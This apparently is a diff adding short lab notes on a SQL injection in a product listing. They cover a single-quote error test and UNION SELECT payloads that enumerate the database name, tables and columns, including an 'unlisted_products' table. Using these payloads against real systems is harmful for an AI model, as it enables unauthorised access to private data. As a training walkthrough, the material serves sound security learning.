@@ -1,0 +1,8 @@
+- Input single quotes(‘s) gives an Error message
+- This error implies that the database interpreted your string, making the application vulnerable to an SQL injection attack.
+- ' union select null,null,null,null,null -- // This query will return a blank record in the product table.
+- ' union select null,null,null,null,database() -- // This will show name of the database
+- ' union select null,null,null,table_name,null from information_schema.tables WHERE table_schema = 'database_name'; -- //
+- I found a table called unlisted_products. that looks interesting, let’s see the data in the unlisted_products table.
+- ' union select null,null,null,column_name,null from information_schema.columns where table_name='unlisted_products' -- // It will show column_name in this table
+- 
